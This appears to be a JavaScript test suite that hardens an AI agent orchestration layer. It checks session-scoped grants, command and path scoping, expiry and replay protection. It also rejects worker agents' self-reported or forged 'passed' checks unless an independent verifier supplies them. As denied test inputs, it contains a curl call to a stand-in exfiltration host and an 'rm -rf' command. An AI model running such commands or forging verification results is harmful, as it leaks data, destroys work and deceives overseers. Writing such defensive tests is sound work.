import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { Dispatcher } from '../../orchestration-core/src/dispatcher.js';
import {
  evaluateGrant,
  createActionRequest,
  validateGrant,
  dispatcherReceiptToTaskResult,
  rctReceiptToTaskResult,
  protocolAssignmentToDispatcherEnvelope,
  dispatcherEnvelopeToProtocolAssignment,
  protocolAssignmentToRctManifest,
  validateAssignment,
  ValidationError,
  SCHEMA_VERSIONS,
  ActionType,
  TaskState,
  VerificationStatus,
  WorkerReportedState
} from '../src/index.js';

describe('Adversarial Regression Tests for Authority & Compatibility Hardening', () => {
  const baseTime = 1700000000000;

  // =========================================================================
  // Finding 1: Dispatcher receipt checks must not invent verifier evidence
  // =========================================================================
  describe('P1 Finding 1: Dispatcher String Checks & Legacy Labels', () => {
    it('rejects completed status and verified=true when checks are string labels (even saying passed)', () => {
      const receiptWithLegacyLabels = {
        id: 'task-legacy',
        agent: 'AGR-3',
        state: 'COMPLETED',
        changedFiles: ['src/index.js'],
        checks: ['npm test: passed', 'build: passed'], // legacy string labels
        summary: 'Worker reports completed'
      };

      const result = dispatcherReceiptToTaskResult(receiptWithLegacyLabels, { attemptId: 1 });
      // Must not fabricate verified=true or completed status!
      assert.equal(result.status, TaskState.FAILED);
      assert.equal(result.verification.verified, false);
      assert.equal(result.verification.status, VerificationStatus.NOT_REQUESTED);
      assert.equal(result.verification.checkResults.length, 0); // No fabricated checks!
      // Legacy strings preserved in workerClaim
      assert.deepEqual(result.workerClaim.legacyCheckLabels, ['npm test: passed', 'build: passed']);
      assert.deepEqual(result.workerClaim.rawChecks, ['npm test: passed', 'build: passed']);
      assert(result.uncertainty.reasons.some(r => r.includes('unverified_worker_receipt')));
    });

    it('rejects completed status when string check says failed', () => {
      const receiptWithFailedString = {
        id: 'task-legacy-fail',
        agent: 'AGR-3',
        state: 'COMPLETED', // Worker falsely claimed completed
        changedFiles: ['src/index.js'],
        checks: ['npm test: failed'],
        summary: 'Completed with errors'
      };

      const result = dispatcherReceiptToTaskResult(receiptWithFailedString, { attemptId: 1 });
      assert.equal(result.status, TaskState.FAILED);
      assert.equal(result.verification.verified, false);
      assert.equal(result.verification.checkResults.length, 0);
      assert.deepEqual(result.workerClaim.rawChecks, ['npm test: failed']);
    });

    it('rejects fabricated structured checks in receipt when trustedChecks are omitted', () => {
      // Worker tries to forge structured verification in raw receipt.checks
      const receiptWithFabricatedChecks = {
        id: 'task-fabricated',
        agent: 'AGR-3',
        state: 'COMPLETED',
        changedFiles: ['src/index.js'],
        checks: [
          { checkId: 'forged-unit-test', passed: true, details: { exitCode: 0 } },
          { checkId: 'forged-lint', passed: true, details: { exitCode: 0 } }
        ],
        summary: 'Worker fabricated all passed'
      };

      const result = dispatcherReceiptToTaskResult(receiptWithFabricatedChecks, { attemptId: 1 });
      // Must fail closed: raw receipt.checks can NEVER verify
      assert.equal(result.status, TaskState.FAILED);
      assert.equal(result.verification.verified, false);
      assert.equal(result.verification.status, VerificationStatus.NOT_REQUESTED);
      assert.equal(result.verification.checkResults.length, 0);
      // All raw checks must be retained as unverified worker claims
      assert.equal(result.workerClaim.rawChecks.length, 2);
      assert.equal(result.workerClaim.rawChecks[0].checkId, 'forged-unit-test');
      assert(result.uncertainty.reasons.some(r => r.includes('unverified_worker_receipt')));
    });

    it('rejects mixed strings and structured checks in receipt when trustedChecks are omitted', () => {
      const receiptWithMixedChecks = {
        id: 'task-mixed',
        agent: 'AGR-3',
        state: 'COMPLETED',
        changedFiles: ['src/index.js'],
        checks: [
          'npm test: passed',
          { checkId: 'check-struct', passed: true }
        ],
        summary: 'Worker claims mixed checks passed'
      };

      const result = dispatcherReceiptToTaskResult(receiptWithMixedChecks, { attemptId: 1 });
      assert.equal(result.status, TaskState.FAILED);
      assert.equal(result.verification.verified, false);
      assert.equal(result.verification.checkResults.length, 0);
      assert.deepEqual(result.workerClaim.legacyCheckLabels, ['npm test: passed']);
      assert.equal(result.workerClaim.rawChecks.length, 2);
    });

    it('rejects completed status when trustedChecks contains a failed check', () => {
      const receipt = {
        id: 'task-failed-trusted',
        agent: 'AGR-3',
        state: 'COMPLETED',
        changedFiles: ['src/index.js'],
        checks: ['npm test: passed'],
        summary: 'Worker falsely claims success'
      };

      const result = dispatcherReceiptToTaskResult(receipt, {
        attemptId: 1,
        verifierId: 'independent_verifier',
        trustedChecks: [
          { checkId: 'unit-test', passed: true },
          { checkId: 'integration-test', passed: false }
        ]
      });

      assert.equal(result.status, TaskState.FAILED);
      assert.equal(result.verification.verified, false);
      assert.equal(result.verification.status, VerificationStatus.FAILED);
      assert.equal(result.verification.verifierId, 'independent_verifier');
      assert.equal(result.verification.checkResults.length, 2);
    });

    it('accepts completed status when explicit trustedChecks pass and explicit verifierId is provided', () => {
      const receipt = {
        id: 'task-verified',
        agent: 'AGR-3',
        state: 'COMPLETED',
        changedFiles: ['src/index.js'],
        checks: ['npm test: passed'],
        summary: 'Worker done'
      };

      const result = dispatcherReceiptToTaskResult(receipt, {
        attemptId: 1,
        verifierId: 'rct_runtime_verifier',
        trustedChecks: [
          { checkId: 'unit-test', passed: true, details: { exitCode: 0 } },
          { checkId: 'lint', passed: true, details: { exitCode: 0 } }
        ]
      });

      assert.equal(result.status, TaskState.COMPLETED);
      assert.equal(result.verification.verified, true);
      assert.equal(result.verification.status, VerificationStatus.PASSED);
      assert.equal(result.verification.verifierId, 'rct_runtime_verifier');
      assert.equal(result.verification.checkResults.length, 2);
    });

    it('throws ValidationError when trustedChecks are provided without explicit non-empty verifierId', () => {
      const receipt = {
        id: 'task-no-verifier',
        agent: 'AGR-3',
        state: 'COMPLETED',
        changedFiles: ['src/index.js'],
        checks: [],
        summary: 'Worker done'
      };

      assert.throws(
        () => dispatcherReceiptToTaskResult(receipt, {
          attemptId: 1,
          // verifierId omitted!
          trustedChecks: [{ checkId: 'c1', passed: true }]
        }),
        (err) => {
          assert(err instanceof ValidationError);
          assert(err.message.includes('options.trustedChecks requires an explicit non-empty options.verifierId'));
          return true;
        }
      );
    });

    it("rejects trustedChecks with string 'false' rather than coercing truthiness", () => {
      const receipt = {
        id: 'task-truthiness-false',
        agent: 'AGR-3',
        state: 'COMPLETED',
        changedFiles: ['src/index.js'],
        checks: [],
        summary: 'Worker done'
      };

      assert.throws(
        () => dispatcherReceiptToTaskResult(receipt, {
          attemptId: 1,
          verifierId: 'reviewer',
          trustedChecks: [{ checkId: 'c1', passed: 'false' }]
        }),
        (err) => {
          assert(err instanceof ValidationError);
          assert(err.message.includes('must be a boolean'));
          return true;
        }
      );
    });

    it("rejects trustedChecks with string 'true' rather than coercing truthiness", () => {
      const receipt = {
        id: 'task-truthiness-true',
        agent: 'AGR-3',
        state: 'COMPLETED',
        changedFiles: ['src/index.js'],
        checks: [],
        summary: 'Worker done'
      };

      assert.throws(
        () => dispatcherReceiptToTaskResult(receipt, {
          attemptId: 1,
          verifierId: 'reviewer',
          trustedChecks: [{ checkId: 'c1', passed: 'true' }]
        }),
        (err) => {
          assert(err instanceof ValidationError);
          assert(err.message.includes('must be a boolean'));
          return true;
        }
      );
    });

    it('rejects trustedChecks with numeric 1 rather than coercing truthiness', () => {
      const receipt = {
        id: 'task-truthiness-num1',
        agent: 'AGR-3',
        state: 'COMPLETED',
        changedFiles: ['src/index.js'],
        checks: [],
        summary: 'Worker done'
      };

      assert.throws(
        () => dispatcherReceiptToTaskResult(receipt, {
          attemptId: 1,
          verifierId: 'reviewer',
          trustedChecks: [{ checkId: 'c1', passed: 1 }]
        }),
        (err) => {
          assert(err instanceof ValidationError);
          assert(err.message.includes('must be a boolean'));
          return true;
        }
      );
    });

    it('rejects trustedChecks with numeric 0 rather than coercing truthiness', () => {
      const receipt = {
        id: 'task-truthiness-num0',
        agent: 'AGR-3',
        state: 'COMPLETED',
        changedFiles: ['src/index.js'],
        checks: [],
        summary: 'Worker done'
      };

      assert.throws(
        () => dispatcherReceiptToTaskResult(receipt, {
          attemptId: 1,
          verifierId: 'reviewer',
          trustedChecks: [{ checkId: 'c1', passed: 0 }]
        }),
        (err) => {
          assert(err instanceof ValidationError);
          assert(err.message.includes('must be a boolean'));
          return true;
        }
      );
    });

    it('rejects trustedChecks with omitted passed property', () => {
      const receipt = {
        id: 'task-truthiness-omitted',
        agent: 'AGR-3',
        state: 'COMPLETED',
        changedFiles: ['src/index.js'],
        checks: [],
        summary: 'Worker done'
      };

      assert.throws(
        () => dispatcherReceiptToTaskResult(receipt, {
          attemptId: 1,
          verifierId: 'reviewer',
          trustedChecks: [{ checkId: 'c1' }] // passed omitted
        }),
        (err) => {
          assert(err instanceof ValidationError);
          assert(err.message.includes('must be a boolean'));
          return true;
        }
      );
    });

    it('rejects trustedChecks with null passed property', () => {
      const receipt = {
        id: 'task-truthiness-null',
        agent: 'AGR-3',
        state: 'COMPLETED',
        changedFiles: ['src/index.js'],
        checks: [],
        summary: 'Worker done'
      };

      assert.throws(
        () => dispatcherReceiptToTaskResult(receipt, {
          attemptId: 1,
          verifierId: 'reviewer',
          trustedChecks: [{ checkId: 'c1', passed: null }]
        }),
        (err) => {
          assert(err instanceof ValidationError);
          assert(err.message.includes('must be a boolean'));
          return true;
        }
      );
    });

    it('rejects trustedChecks containing non-object element', () => {
      const receipt = {
        id: 'task-truthiness-nonobj',
        agent: 'AGR-3',
        state: 'COMPLETED',
        changedFiles: ['src/index.js'],
        checks: [],
        summary: 'Worker done'
      };

      assert.throws(
        () => dispatcherReceiptToTaskResult(receipt, {
          attemptId: 1,
          verifierId: 'reviewer',
          trustedChecks: ['malformed-check-string']
        }),
        (err) => {
          assert(err instanceof ValidationError);
          assert(err.message.includes('must be an object'));
          return true;
        }
      );
    });

    it('rejects RCT receipt checks with non-boolean passed property', () => {
      const rctReceipt = {
        id: 'rct-string-false',
        state: 'review_ready',
        checks: [{ type: 'equals', path: 'file.js', passed: 'false' }],
        patches: []
      };

      assert.throws(
        () => rctReceiptToTaskResult(rctReceipt),
        (err) => {
          assert(err instanceof ValidationError);
          assert(err.message.includes('must be a boolean'));
          return true;
        }
      );
    });
  });

  // =========================================================================
  // Finding 2: Authority session matching
  // =========================================================================
  describe('P1 Finding 2: Session Matching Against Session-Scoped Grants', () => {
    const sessionGrant = {
      schemaVersion: SCHEMA_VERSIONS.GRANT,
      grantId: 'grant-sess',
      principalId: 'worker-1',
      sessionId: 'session-alpha',
      scope: {
        actionTypes: [ActionType.FILE_READ],
        allowedPaths: ['packages/protocol']
      },
      issuedAt: baseTime,
      expiresAt: baseTime + 60000,
      revoked: false,
      issuerId: 'policy'
    };

    it('fails closed when request omits sessionId against a session-scoped grant', () => {
      const reqMissingSession = createActionRequest({
        taskId: 'task-1',
        attemptId: 1,
        principalId: 'worker-1',
        // sessionId omitted!
        actionType: ActionType.FILE_READ,
        parameters: { path: 'packages/protocol/src/index.js' }
      });

      const res = evaluateGrant(sessionGrant, reqMissingSession, { currentTime: baseTime + 100 });
      assert.equal(res.granted, false);
      assert.equal(res.reason, 'session_mismatch');
    });

    it('fails closed when request supplies mismatched sessionId', () => {
      const reqWrongSession = createActionRequest({
        taskId: 'task-1',
        attemptId: 1,
        principalId: 'worker-1',
        sessionId: 'session-hijacker',
        actionType: ActionType.FILE_READ,
        parameters: { path: 'packages/protocol/src/index.js' }
      });

      const res = evaluateGrant(sessionGrant, reqWrongSession, { currentTime: baseTime + 100 });
      assert.equal(res.granted, false);
      assert.equal(res.reason, 'session_mismatch');
    });

    it('authorizes when request supplies matching sessionId', () => {
      const reqValid = createActionRequest({
        taskId: 'task-1',
        attemptId: 1,
        principalId: 'worker-1',
        sessionId: 'session-alpha',
        actionType: ActionType.FILE_READ,
        parameters: { path: 'packages/protocol/src/index.js' }
      });

      const res = evaluateGrant(sessionGrant, reqValid, { currentTime: baseTime + 100 });
      assert.equal(res.granted, true);
    });
  });

  // =========================================================================
  // Finding 3: Fail-closed path & command scope
  // =========================================================================
  describe('P1 Finding 3: Fail-Closed Path and Command Scope', () => {
    it('fails closed for file action when grant has empty allowedPaths', () => {
      const grantNoPaths = {
        schemaVersion: SCHEMA_VERSIONS.GRANT,
        grantId: 'grant-nopaths',
        principalId: 'worker-1',
        sessionId: 'sess-1',
        scope: {
          actionTypes: [ActionType.FILE_READ, ActionType.FILE_WRITE],
          allowedPaths: [] // Empty paths!
        },
        issuedAt: baseTime,
        expiresAt: baseTime + 60000,
        revoked: false,
        issuerId: 'policy'
      };

      const req = createActionRequest({
        taskId: 'task-1',
        attemptId: 1,
        principalId: 'worker-1',
        sessionId: 'sess-1',
        actionType: ActionType.FILE_READ,
        parameters: { path: 'any/path/secret.env' }
      });

      const res = evaluateGrant(grantNoPaths, req, { currentTime: baseTime + 100 });
      assert.equal(res.granted, false);
      assert.equal(res.reason, 'no_paths_in_grant_scope');
    });

    it('fails closed when shell execution omits cwd under path-scoped grant', () => {
      const grantWithPaths = {
        schemaVersion: SCHEMA_VERSIONS.GRANT,
        grantId: 'grant-shell',
        principalId: 'worker-1',
        sessionId: 'sess-1',
        scope: {
          actionTypes: [ActionType.SHELL_EXEC],
          allowedPaths: ['packages/protocol'],
          allowedCommands: ['npm']
        },
        issuedAt: baseTime,
        expiresAt: baseTime + 60000,
        revoked: false,
        issuerId: 'policy'
      };

      const reqNoCwd = createActionRequest({
        taskId: 'task-1',
        attemptId: 1,
        principalId: 'worker-1',
        sessionId: 'sess-1',
        actionType: ActionType.SHELL_EXEC,
        parameters: {
          command: ['npm', 'test']
          // cwd omitted!
        }
      });

      const res = evaluateGrant(grantWithPaths, reqNoCwd, { currentTime: baseTime + 100 });
      assert.equal(res.granted, false);
      assert.equal(res.reason, 'missing_shell_cwd');
    });

    it('fails closed when shell execution specifies cwd outside allowedPaths', () => {
      const grantWithPaths = {
        schemaVersion: SCHEMA_VERSIONS.GRANT,
        grantId: 'grant-shell',
        principalId: 'worker-1',
        sessionId: 'sess-1',
        scope: {
          actionTypes: [ActionType.SHELL_EXEC],
          allowedPaths: ['packages/protocol'],
          allowedCommands: ['npm']
        },
        issuedAt: baseTime,
        expiresAt: baseTime + 60000,
        revoked: false,
        issuerId: 'policy'
      };

      const reqBadCwd = createActionRequest({
        taskId: 'task-1',
        attemptId: 1,
        principalId: 'worker-1',
        sessionId: 'sess-1',
        actionType: ActionType.SHELL_EXEC,
        parameters: {
          command: ['npm', 'test'],
          cwd: 'packages/other-pkg'
        }
      });

      const res = evaluateGrant(grantWithPaths, reqBadCwd, { currentTime: baseTime + 100 });
      assert.equal(res.granted, false);
      assert.equal(res.reason, 'cwd_outside_grant_scope');
    });

    it('fails closed when shell execution attempts descendant directory (no directory-prefix matching)', () => {
      const grantWithPaths = {
        schemaVersion: SCHEMA_VERSIONS.GRANT,
        grantId: 'grant-shell-exact',
        principalId: 'worker-1',
        sessionId: 'sess-1',
        scope: {
          actionTypes: [ActionType.SHELL_EXEC],
          allowedPaths: ['packages/protocol'],
          allowedCommands: ['npm'],
          exactCwd: true
        },
        issuedAt: baseTime,
        expiresAt: baseTime + 60000,
        revoked: false,
        issuerId: 'policy'
      };

      const reqDescendantCwd = createActionRequest({
        taskId: 'task-1',
        attemptId: 1,
        principalId: 'worker-1',
        sessionId: 'sess-1',
        actionType: ActionType.SHELL_EXEC,
        parameters: {
          command: ['npm', 'test'],
          cwd: 'packages/protocol/src' // descendant directory!
        }
      });

      const res = evaluateGrant(grantWithPaths, reqDescendantCwd, { currentTime: baseTime + 100 });
      assert.equal(res.granted, false);
      assert.equal(res.reason, 'cwd_outside_grant_scope');
    });

    it('fails closed when shell execution grant has no allowedPaths (authorized cwds)', () => {
      const grantNoCwds = {
        schemaVersion: SCHEMA_VERSIONS.GRANT,
        grantId: 'grant-no-cwds',
        principalId: 'worker-1',
        sessionId: 'sess-1',
        scope: {
          actionTypes: [ActionType.SHELL_EXEC],
          allowedCommands: ['npm']
          // allowedPaths omitted!
        },
        issuedAt: baseTime,
        expiresAt: baseTime + 60000,
        revoked: false,
        issuerId: 'policy'
      };

      const req = createActionRequest({
        taskId: 'task-1',
        attemptId: 1,
        principalId: 'worker-1',
        sessionId: 'sess-1',
        actionType: ActionType.SHELL_EXEC,
        parameters: {
          command: ['npm', 'test'],
          cwd: 'packages/protocol'
        }
      });

      const res = evaluateGrant(grantNoCwds, req, { currentTime: baseTime + 100 });
      assert.equal(res.granted, false);
      assert.equal(res.reason, 'no_cwds_in_grant_scope');
    });

    it('fails closed when shell execution lacks both exactRequestDigest and allowedCommands', () => {
      const grantUnscopedCommand = {
        schemaVersion: SCHEMA_VERSIONS.GRANT,
        grantId: 'grant-unscoped-cmd',
        principalId: 'worker-1',
        sessionId: 'sess-1',
        scope: {
          actionTypes: [ActionType.SHELL_EXEC],
          allowedPaths: ['packages/protocol']
          // neither exactRequestDigest nor allowedCommands!
        },
        issuedAt: baseTime,
        expiresAt: baseTime + 60000,
        revoked: false,
        issuerId: 'policy'
      };

      const req = createActionRequest({
        taskId: 'task-1',
        attemptId: 1,
        principalId: 'worker-1',
        sessionId: 'sess-1',
        actionType: ActionType.SHELL_EXEC,
        parameters: {
          command: ['rm', '-rf', 'packages/protocol'],
          cwd: 'packages/protocol'
        }
      });

      const res = evaluateGrant(grantUnscopedCommand, req, { currentTime: baseTime + 100 });
      assert.equal(res.granted, false);
      assert.equal(res.reason, 'unscoped_shell_command');
    });

    it('enforces allowedCommands for shell execution and rejects unpermitted commands', () => {
      const grantWithCommands = {
        schemaVersion: SCHEMA_VERSIONS.GRANT,
        grantId: 'grant-commands',
        principalId: 'worker-1',
        sessionId: 'sess-1',
        scope: {
          actionTypes: [ActionType.SHELL_EXEC],
          allowedPaths: ['packages/protocol'],
          allowedCommands: ['npm', ['node', '--test']]
        },
        issuedAt: baseTime,
        expiresAt: baseTime + 60000,
        revoked: false,
        issuerId: 'policy'
      };

      // Allowed command: npm
      const reqNpm = createActionRequest({
        taskId: 'task-1',
        attemptId: 1,
        principalId: 'worker-1',
        sessionId: 'sess-1',
        actionType: ActionType.SHELL_EXEC,
        parameters: { command: ['npm', 'test'], cwd: 'packages/protocol' }
      });
      assert.equal(evaluateGrant(grantWithCommands, reqNpm, { currentTime: baseTime + 100 }).granted, true);

      // Allowed command: node --test prefix
      const reqNode = createActionRequest({
        taskId: 'task-1',
        attemptId: 1,
        principalId: 'worker-1',
        sessionId: 'sess-1',
        actionType: ActionType.SHELL_EXEC,
        parameters: { command: ['node', '--test', 'test/test.js'], cwd: 'packages/protocol' }
      });
      assert.equal(evaluateGrant(grantWithCommands, reqNode, { currentTime: baseTime + 100 }).granted, true);

      // Disallowed command: curl
      const reqCurl = createActionRequest({
        taskId: 'task-1',
        attemptId: 1,
        principalId: 'worker-1',
        sessionId: 'sess-1',
        actionType: ActionType.SHELL_EXEC,
        parameters: { command: ['curl', 'http://exfiltrate.com'], cwd: 'packages/protocol' }
      });
      const curlRes = evaluateGrant(grantWithCommands, reqCurl, { currentTime: baseTime + 100 });
      assert.equal(curlRes.granted, false);
      assert.equal(curlRes.reason, 'command_not_permitted');
    });
  });

  // =========================================================================
  // Finding 4: Dispatcher scope roundtrip authority preservation
  // =========================================================================
  describe('P1 Finding 4: Dispatcher Scope Partition Authority Preservation', () => {
    const symmetricAssignment = {
      schemaVersion: SCHEMA_VERSIONS.ASSIGNMENT,
      taskId: 'sym-task',
      attemptId: 1,
      agentId: 'AGR-3',
      objective: 'Verify symmetric scope produces array allowedPaths for Dispatcher',
      acceptance: ['Symmetric scope converts to array allowedPaths'],
      scope: {
        root: 'E:/Veyminore/products/zetro',
        readPaths: ['packages/protocol/src/index.js'],
        writePaths: ['packages/protocol/src/index.js'],
        createPaths: []
      },
      checks: [{ type: 'command', command: ['npm', 'test'] }],
      budget: { maxTurns: 5 },
      dataPolicy: { classification: 'public', allowRemoteInference: false },
      deadlineMs: 30000
    };

    const asymmetricAssignment = {
      schemaVersion: SCHEMA_VERSIONS.ASSIGNMENT,
      taskId: 'asym-task',
      attemptId: 1,
      agentId: 'AGR-1',
      objective: 'Verify partitioned authority preservation',
      acceptance: ['Read-only path is not made writable'],
      scope: {
        root: 'E:/Veyminore/products/zetro',
        readPaths: ['docs/SECURITY.md', 'packages/protocol/src/index.js'],
        writePaths: ['packages/protocol/src/index.js'],
        createPaths: ['packages/protocol/src/new-feature.js']
      },
      checks: [{ type: 'command', command: ['npm', 'test'] }],
      budget: { maxTurns: 5 },
      dataPolicy: { classification: 'public', allowRemoteInference: false },
      deadlineMs: 30000
    };

    it('produces valid Dispatcher TaskEnvelope with array allowedPaths that passes actual Dispatcher.validateEnvelope', () => {
      const envelope = protocolAssignmentToDispatcherEnvelope(symmetricAssignment);

      // Verify envelope has array allowedPaths (satisfying Dispatcher.validateEnvelope)
      assert(Array.isArray(envelope.allowedPaths), 'envelope.allowedPaths must be an Array');
      assert.deepEqual(envelope.allowedPaths, ['packages/protocol/src/index.js']);
      assert.deepEqual(envelope.scope.readPaths, ['packages/protocol/src/index.js']);
      assert.deepEqual(envelope.scope.writePaths, ['packages/protocol/src/index.js']);

      // CRITICAL: Call actual Dispatcher instance validateEnvelope from orchestration-core
      const dispatcher = new Dispatcher({}, 'temp-journal.jsonl');
      assert.doesNotThrow(() => {
        dispatcher.validateEnvelope(envelope);
      }, 'Must pass actual Dispatcher.validateEnvelope without error');

      // Roundtrips back to Assignment
      const restored = dispatcherEnvelopeToProtocolAssignment(envelope);
      assert.deepEqual(restored.scope.readPaths, symmetricAssignment.scope.readPaths);
      assert.deepEqual(restored.scope.writePaths, symmetricAssignment.scope.writePaths);
    });

    it('fails closed and rejects asymmetric Assignment conversion by default with ValidationError', () => {
      assert.throws(
        () => protocolAssignmentToDispatcherEnvelope(asymmetricAssignment),
        (err) => {
          assert(err instanceof ValidationError);
          assert(err.message.includes('Asymmetric conversion rejected'));
          assert(err.message.includes('Dispatcher requires allowedPaths to be a flat array'));
          return true;
        }
      );
    });

    it('permits flattening asymmetric scope only when allowAsymmetricFlattening is explicitly passed', () => {
      const envelope = protocolAssignmentToDispatcherEnvelope(asymmetricAssignment, {
        allowAsymmetricFlattening: true
      });

      assert(Array.isArray(envelope.allowedPaths));
      assert.deepEqual(envelope.allowedPaths, [
        'docs/SECURITY.md',
        'packages/protocol/src/index.js',
        'packages/protocol/src/new-feature.js'
      ]);
      // envelope.scope preserves the partitioned metadata
      assert.deepEqual(envelope.scope.readPaths, ['docs/SECURITY.md', 'packages/protocol/src/index.js']);
      assert.deepEqual(envelope.scope.writePaths, ['packages/protocol/src/index.js']);
      assert.deepEqual(envelope.scope.createPaths, ['packages/protocol/src/new-feature.js']);

      // Roundtrip back preserves original partitions from envelope.scope
      const restored = dispatcherEnvelopeToProtocolAssignment(envelope);
      assert.deepEqual(restored.scope.readPaths, asymmetricAssignment.scope.readPaths);
      assert.deepEqual(restored.scope.writePaths, asymmetricAssignment.scope.writePaths);
      assert.deepEqual(restored.scope.createPaths, asymmetricAssignment.scope.createPaths);
    });
  });

  // =========================================================================
  // Finding 5: RCT command checks drop rejection
  // =========================================================================
  describe('P2 Finding 5: RCT Check Drop Rejection', () => {
    it('rejects conversion of Assignment with command check to RCT manifest', () => {
      const assignmentWithCommandCheck = {
        schemaVersion: SCHEMA_VERSIONS.ASSIGNMENT,
        taskId: 'cmd-check-task',
        attemptId: 1,
        agentId: 'AGR-1',
        objective: 'Test command check rejection',
        acceptance: ['Command check cannot be dropped'],
        scope: {
          root: 'E:/Veyminore/products/zetro',
          readPaths: ['packages/protocol/src/index.js'],
          writePaths: ['packages/protocol/src/index.js'],
          createPaths: []
        },
        checks: [
          { type: 'command', command: ['npm', 'test'] }
        ],
        budget: { maxTurns: 5 },
        dataPolicy: { classification: 'public', allowRemoteInference: false },
        deadlineMs: 30000
      };

      assert.throws(
        () => protocolAssignmentToRctManifest(assignmentWithCommandCheck),
        (err) => {
          assert(err instanceof ValidationError);
          assert(err.message.includes('check type(s) [command] are not supported by rct.assignment.v1'));
          assert(err.message.includes('Conversion rejected to prevent weakening acceptance criteria'));
          return true;
        }
      );
    });

    it('accepts conversion when Assignment uses only equals and contains checks', () => {
      const assignmentWithFileChecks = {
        schemaVersion: SCHEMA_VERSIONS.ASSIGNMENT,
        taskId: 'file-check-task',
        attemptId: 1,
        agentId: 'AGR-1',
        objective: 'Test file check conversion',
        acceptance: ['File check passes'],
        scope: {
          root: 'E:/Veyminore/products/zetro',
          readPaths: ['packages/protocol/src/index.js'],
          writePaths: ['packages/protocol/src/index.js'],
          createPaths: []
        },
        checks: [
          { type: 'contains', path: 'packages/protocol/src/index.js', text: 'export' }
        ],
        budget: { maxTurns: 5 },
        dataPolicy: { classification: 'public', allowRemoteInference: false },
        deadlineMs: 30000
      };

      const manifest = protocolAssignmentToRctManifest(assignmentWithFileChecks);
      assert.equal(manifest.checks.length, 1);
      assert.equal(manifest.checks[0].type, 'contains');
    });
  });

  // =========================================================================
  // Finding 6: Expiry at exact boundary & Replay Protection
  // =========================================================================
  describe('P1 Finding 6: Expiry at Exact Boundary & Replay Protection', () => {
    const boundaryGrant = {
      schemaVersion: SCHEMA_VERSIONS.GRANT,
      grantId: 'grant-boundary',
      principalId: 'worker-1',
      sessionId: 'sess-1',
      scope: {
        actionTypes: [ActionType.FILE_READ],
        allowedPaths: ['packages/protocol']
      },
      issuedAt: 1000,
      expiresAt: 2000,
      revoked: false,
      issuerId: 'policy'
    };

    const req = createActionRequest({
      taskId: 'task-1',
      attemptId: 1,
      principalId: 'worker-1',
      sessionId: 'sess-1',
      actionType: ActionType.FILE_READ,
      parameters: { path: 'packages/protocol/src/index.js' }
    });

    it('fails closed at exact expiration boundary (currentTime === expiresAt)', () => {
      const res = evaluateGrant(boundaryGrant, req, { currentTime: 2000 });
      assert.equal(res.granted, false);
      assert.equal(res.reason, 'grant_expired');
    });

    it('authorizes 1 ms before expiration (currentTime === expiresAt - 1)', () => {
      const res = evaluateGrant(boundaryGrant, req, { currentTime: 1999 });
      assert.equal(res.granted, true);
    });

    it('fails closed 1 ms after expiration (currentTime === expiresAt + 1)', () => {
      const res = evaluateGrant(boundaryGrant, req, { currentTime: 2001 });
      assert.equal(res.granted, false);
      assert.equal(res.reason, 'grant_expired');
    });

    it('authorizes at exact issue timestamp (currentTime === issuedAt)', () => {
      const res = evaluateGrant(boundaryGrant, req, { currentTime: 1000 });
      assert.equal(res.granted, true);
    });

    it('fails closed 1 ms before issue timestamp (currentTime === issuedAt - 1)', () => {
      const res = evaluateGrant(boundaryGrant, req, { currentTime: 999 });
      assert.equal(res.granted, false);
      assert.equal(res.reason, 'grant_not_yet_valid');
    });

    it('enforces exact-request replay protection using consumedRequestIds', () => {
      const consumedIds = new Set();

      // First evaluation: not consumed -> granted
      const firstRes = evaluateGrant(boundaryGrant, req, {
        currentTime: 1500,
        consumedRequestIds: consumedIds
      });
      assert.equal(firstRes.granted, true);

      // Record consumed
      consumedIds.add(req.requestId);

      // Replay of same requestId -> denied with request_already_consumed
      const replayRes = evaluateGrant(boundaryGrant, req, {
        currentTime: 1500,
        consumedRequestIds: consumedIds
      });
      assert.equal(replayRes.granted, false);
      assert.equal(replayRes.reason, 'request_already_consumed');
      assert.equal(replayRes.details.requestId, req.requestId);
    });
  });
});
